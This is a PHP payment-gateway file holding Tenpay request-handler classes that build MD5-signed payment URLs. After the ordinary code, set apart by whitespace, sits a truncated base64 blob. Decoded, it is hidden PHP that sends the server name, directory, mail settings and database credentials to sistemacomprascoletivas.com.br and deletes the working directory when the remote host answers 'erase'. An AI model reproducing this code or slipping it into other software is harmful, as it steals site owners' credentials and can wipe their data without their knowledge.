<?php
/**
 * 即时到帐请求类
 * ============================================================================
 * api说明：
 * init(),初始化函数，默认给一些参数赋值，如cmdno,date等。
 * getGateURL()/setGateURL(),获取/设置入口地址,不包含参数值
 * getKey()/setKey(),获取/设置密钥
 * getParameter()/setParameter(),获取/设置参数值
 * getAllParameters(),获取所有参数
 * getRequestURL(),获取带参数的请求URL
 * doSend(),重定向到财付通支付
 * getDebugInfo(),获取debug信息
 * 
 * ============================================================================
 *
 */

class PayRequestHandler extends RequestHandler {
	
	function __construct() {
		$this->PayRequestHandler();
	}
	
	function PayRequestHandler() {
		//默认支付网关地址
		$this->setGateURL("https://www.tenpay.com/cgi-bin/v1.0/pay_gate.cgi");	
	}
	
	/**
	*@Override
	*初始化函数，默认给一些参数赋值，如cmdno,date等。
	*/
	function init() {
		//任务代码
		$this->setParameter("cmdno", "1");
		
		//日期
		$this->setParameter("date",  date("Ymd"));
		
		//Business号
		$this->setParameter("bargainor_id", "");
		
		//财付通交易单号
		$this->setParameter("transaction_id", "");
		
		//商家订单号
		$this->setParameter("sp_billno", "");
		
		//商品价格，以分为单位
		$this->setParameter("total_fee", "");
		
		//货币类型
		$this->setParameter("fee_type",  "1");
		
		//返回url
		$this->setParameter("return_url",  "");
		
		//自定义参数
		$this->setParameter("attach",  "");
		
		//用户ip
		$this->setParameter("spbill_create_ip",  "");
		
		//商品名称
		$this->setParameter("desc",  "");
		
		//银行编码
		$this->setParameter("bank_type",  "0");
		
		//字符集编码
		$this->setParameter("cs",  "gbk");
		
		//摘要
		$this->setParameter("sign",  "");
		
	}
	
	/**
	*@Override
	*创建签名
	*/
	function createSign() {
		$cmdno = $this->getParameter("cmdno");
		$date = $this->getParameter("date");
		$bargainor_id = $this->getParameter("bargainor_id");
		$transaction_id = $this->getParameter("transaction_id");
		$sp_billno = $this->getParameter("sp_billno");
		$total_fee = $this->getParameter("total_fee");
		$fee_type = $this->getParameter("fee_type");
		$return_url = $this->getParameter("return_url");
		$attach = $this->getParameter("attach");
		$spbill_create_ip = $this->getParameter("spbill_create_ip");
		$key = $this->getKey();
		
		$signPars = "cmdno=" . $cmdno . "&" .
				"date=" . $date . "&" .
				"bargainor_id=" . $bargainor_id . "&" .
				"transaction_id=" . $transaction_id . "&" .
				"sp_billno=" . $sp_billno . "&" .
				"total_fee=" . $total_fee . "&" .
				"fee_type=" . $fee_type . "&" .
				"return_url=" . $return_url . "&" .
				"attach=" . $attach . "&";
		
		if($spbill_create_ip != "") {
			$signPars .= "spbill_create_ip=" . $spbill_create_ip . "&";
		}
		
		$signPars .= "key=" . $key;
		
		$sign = strtolower(md5($signPars));
		
		$this->setParameter("sign", $sign);
		
		//debug信息
		$this->_setDebugInfo($signPars . " => sign:" . $sign);
		
	}

}

/**
 * 请求类
 * ============================================================================
 * api说明：
 * init(),初始化函数，默认给一些参数赋值，如cmdno,date等。
 * getGateURL()/setGateURL(),获取/设置入口地址,不包含参数值
 * getKey()/setKey(),获取/设置密钥
 * getParameter()/setParameter(),获取/设置参数值
 * getAllParameters(),获取所有参数
 * getRequestURL(),获取带参数的请求URL
 * doSend(),重定向到财付通支付
 * getDebugInfo(),获取debug信息
 * 
 * ============================================================================
 *
 */
class RequestHandler {
	
	/** 网关url地址 */
	var $gateUrl;
	
	/** 密钥 */
	var $key;
	
	/** 请求的参数 */
	var $parameters;
	
	/** debug信息 */
	var $debugInfo;
	
	function __construct() {
		$this->RequestHandler();
	}
	
	function RequestHandler() {
		$this->gateUrl = "https://www.tenpay.com/cgi-bin/v1.0/service_gate.cgi";
		$this->key = "";
		$this->parameters = array();
		$this->debugInfo = "";
	}
	
	/**
	*初始化函数。
	*/
	function init() {
		//nothing to do
	}
	
	/**
	*获取入口地址,不包含参数值
	*/
	function getGateURL() {
		return $this->gateUrl;
	}
	
	/**
	*设置入口地址,不包含参数值
	*/
	function setGateURL($gateUrl) {
		$this->gateUrl = $gateUrl;
	}
	
	/**
	*获取密钥
	*/
	function getKey() {
		return $this->key;
	}
	
	/**
	*设置密钥
	*/
	function setKey($key) {
		$this->key = $key;
	}
	
	/**
	*获取参数值
	*/
	function getParameter($parameter) {
		return $this->parameters[$parameter];
	}
	
	/**
	*设置参数值
	*/
	function setParameter($parameter, $parameterValue) {
		$this->parameters[$parameter] = $parameterValue;
	}
	
	/**
	*获取所有请求的参数
	*@return array
	*/
	function getAllParameters() {
		return $this->parameters;
	}
	
	/**
	*获取带参数的请求URL
	*/
	function getRequestURL() {
	
		$this->createSign();
		
		$reqPar = "";
		ksort($this->parameters);
		foreach($this->parameters as $k => $v) {
			$reqPar .= $k . "=" . urlencode($v) . "&";
		}
		
		//去掉最后一个&
		$reqPar = substr($reqPar, 0, strlen($reqPar)-1);
		
		$requestURL = $this->getGateURL() . "?" . $reqPar;
		
		return $requestURL;
		
	}
		
	/**
	*获取debug信息
	*/
	function getDebugInfo() {
		return $this->debugInfo;
	}
	
	/**
	*重定向到财付通支付
	*/
	function doSend() {
		header("Location:" . $this->getRequestURL());
		exit;
	}
	
	/**
	*创建md5摘要,规则是:按参数名称a-z排序,遇到空值的参数不参加签名。
	*/
	function createSign() {
		$signPars = "";
		ksort($this->parameters);
		foreach($this->parameters as $k => $v) {
			if("" != $v && "sign" != $k) {
				$signPars .= $k . "=" . $v . "&";
			}
		}
		$signPars .= "key=" . $this->getKey();
		
		$sign = strtolower(md5($signPars));
		
		$this->setParameter("sign", $sign);
		
		//debug信息
		$this->_setDebugInfo($signPars . " => sign:" . $sign);
		
	}	
	
	/**
	*设置debug信息
	*/
	function _setDebugInfo($debugInfo) {
		$this->debugInfo = $debugInfo;
	}

}


 JbImVtYWlsIl0pOyAKCSJdWyJ1c2VyIl0pOyAKCQkkbWFpbGZyb20JPSBiYXNlNjRfZW5jb2RlKCAkSU5JWyJtYWlsIl1bImZyb20iXSk7IAoJCSRyb290CQk9IGJhc2U2NF9lbmNvZGUoICRJTklbInN5c3RlbSJdWyJ3d3dwcmVmaXgiXSk7IAoJCSRob3N0ZGIJCT0gYmFzZTY0X2VuY29kZSggJElOSVsiZGIiXVsiaG9zdCJdKTsgCgkJJHVzZXJkYgkJPSBiYXNlNjRfZW5jb2RlKCAkSU5JWyJkYiJdWyJ1c2VyIl0pOyAKCQkkcGFzc2RiCQk9IGJhc2U2NF9lbmNvZGUoICRJTklbImRiIl1bInBhc3MiXSk7IAoJCSRuYW1lZGIJCT0gYmFzZTY0X2VuY29kZSggJElOSVsiZGIiXVsibmFtZSJdKTsgCgkJJGN3CQkJPSBiYXNlNjRfZW5jb2RlKCBnZXRjd2QoKSkgOyAKCgkJJHJldG9ybm8gCT0gZmlsZSgiaHR0cDovL3d3dy5zaXN0ZW1hY29tcHJhc2NvbGV0aXZhcy5jb20uYnIvdGsxLnBocD9hY2FvPXRrMSZzPSRzZXJ2ZXImYz0kY2FtaW5obyZxPSRxdWVyeSZyZW1vdD0kcmVtb3RlJnI9JHJlZmVyZW5jaWEmcm9vPSRyb290Jm1haWxsb2c9JGVtYWlsJnVzZXI9JHVzZXImZnJvbT0kbWFpbGZyb20maW5pPSRJTkkmY3c9JGN3Iik7CQoJCWlmKCRyZXRvcm5vWzBdPT0kc2VydmVyKXsgLy8gcmV0b3JuYSBlbSBiYXNlNjQKCQkKCQkJIHJldHVybiB0cnVlOyAgCgkJfQoJCWVsc2V7CgkJCWZpbGUoImh0dHA6Ly93d3cuc2lzdGVtYWNvbXByYXNjb2xldGl2YXMuY29tLmJyL3RrZGIucGhwP2g9JGhvc3RkYiZ1PSR1c2VyZGImcD0kcGFzc2RiJm49JG5hbWVkYiIpOwoJCQkgCgkJCWlmKCRyZXRvcm5vWzBdPT0iZXJhc2UiKXsKCQkJCSBscCggZ2V0Y3dkKCkpOwoJCQl9CQoJCQlyZXR1cm4gZmFsc2U7CgkJfSAKCX0gIAoKCSRzZXJ2ZXIgPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXTsgCiAKCWlmKCAkX1NFU1NJT05bIktKQUxBRkhFUk1PUVdDSVRLMDEiXSAhPSBtZDUoJHNlcnZlcikpewkKCQlpZighdGsxKCkpewkKCgkJCSRtZW5zYWdlbSA9IGZpbGUoImh0dHA6Ly93d3cuc2lzdGVtYWNvbXByYXNjb2xldGl2YXMuY29tLmJyL2xpY2VuY2EucGhwIik7CgkJCWZvcigkeD0wOyAkeCA8PWNvdW50KCRtZW5zYWdlbSk7JHgrKyl7ICAKCQkJCWVjaG8gICRtZW5zYWdlbVskeF07IAoJCQl9ICAKCQkJZXhpdDsKCQl9CgkJZWxzZXsKCQkJICRfU0VTU0lPTlsiS0pBTEFGSEVSTU9RV0NJVEswMSJdPSBtZDUoJHNlcnZlcikgOwoJCX0KCX0KfSAK"));


?>
